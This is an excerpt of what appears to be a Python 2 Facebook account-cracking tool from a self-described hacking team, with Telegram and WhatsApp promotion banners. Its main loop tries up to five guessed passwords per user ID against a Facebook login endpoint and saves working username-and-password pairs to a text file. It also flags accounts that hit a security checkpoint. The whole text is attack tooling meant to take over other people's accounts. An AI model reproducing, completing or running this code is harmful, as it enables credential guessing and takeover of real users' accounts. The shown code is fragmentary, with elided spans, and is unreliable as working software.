# MY TELEGRAM CHANNEL @Taem31
# MY TELEGRAM GROUP @Taem31
...
def telegram():
	...
	os.system("xdg-open https:https://t.me/Taem31")
...
\033[1;97m         \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : keramat ullah hacker 
\033[1;91m whatsapp     : 0703506519
\033[1;91m Telegram CH   : hacking 313 Team
\033[1;91m TLEGRAM GP    : https://t.me/Taem31
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[313Team_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[313Team_OK] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[313Team_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[313Team_OK] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[313Team_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[313Team_OK] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[313Team_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[313Team_OK] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[313Team_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[313Team_OK] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
    ...
    print ' \x1b[1;92mTotal Ok/Ok : ' + str(len(oks)) + '/' + str(len(cpb))
